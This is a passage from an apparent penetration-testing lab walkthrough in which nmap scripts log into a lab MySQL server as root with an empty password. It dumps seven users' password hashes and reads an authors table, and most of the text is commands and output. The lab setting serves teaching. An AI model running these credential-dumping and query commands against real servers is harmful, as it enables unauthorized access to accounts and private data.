> 16. Dump all user hashes using nmap script.

> **Answer:**
>
> Users hashes are:
>
> `debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D`
>
> `filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B`
>
> `ultra:*827EC562775DC9CE458689D36687DCED320F34B0`
>
> `guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646`
>
> `sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0`
>
> `udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9`
>
> `sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14`

```bash
root@attackdefense:~# nmap --script mysql-dump-hashes --script-args "username='root',password=''" -p3306 192.15.56.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 16:29 UTC
Nmap scan report for target-1 (192.15.56.3)
Host is up (0.000044s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-dump-hashes: 
|   debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
|   filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
|   ultra:*827EC562775DC9CE458689D36687DCED320F34B0
|   guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
|   sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
|   udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
|_  sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
MAC Address: 02:42:C0:0F:38:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
```

> 17. Find the number of records stored in table “authors” in database “books” stored on MySQL Server using `mysql-query` nmap script.

> Answer: `10`

```bash
root@attackdefense:~# nmap --script mysql-query --script-args "username=root,password='',query=select count(*) from books.authors" -p3306 192.15.56.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 16:34 UTC
Nmap scan report for target-1 (192.15.56.3)
Host is up (0.000047s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-query: 
|   count(*)
|   10
|   
|   Query: select count(*) from books.authors
|_  User: root
MAC Address: 02:42:C0:0F:38:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
```

```bash
root@attackdefense:~# nmap --script mysql-query --script-args "username=root,password='',query=select * from books.authors" -p3306 192.15.56.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 16:34 UTC
Nmap scan report for target-1 (192.15.56.3)
Host is up (0.000042s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-query: 
|   id  first_name  last_name  email                        birthdate   added
|   1   Gregoria    Lowe       gutmann.rebekah@example.net  1982-03-09  1983-01-11 11:25:43
|   2   Ona         Anderson   ethelyn02@example.net        1980-06-02  1972-05-05 07:26:52
|   3   Emile       Lakin      rippin.freda@example.com     1979-04-06  2010-05-30 20:03:07
|   4   Raul        Barton     mschiller@example.com        1976-05-06  1979-02-08 12:32:29
|   5   Sofia       Collier    rodrigo34@example.net        1978-06-09  1991-05-01 10:02:54
|   6   Wellington  Fay        jared98@example.com          2011-08-11  1992-05-27 23:20:20
|   7   Garnet      Braun      hickle.howell@example.net    1990-04-27  2010-04-13 09:48:36
|   8   Alessia     Kuphal     skiles.reggie@example.net    1978-04-06  2014-08-22 21:23:00
|   9   Deven       Carroll    savanah.zulauf@example.net   2007-02-15  1998-02-16 11:45:32
|   10  Issac       Stanton    ozella10@example.net         2013-10-13  1976-12-09 13:18:45
|   
|   Query: select * from books.authors
|_  User: root
MAC Address: 02:42:C0:0F:38:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```











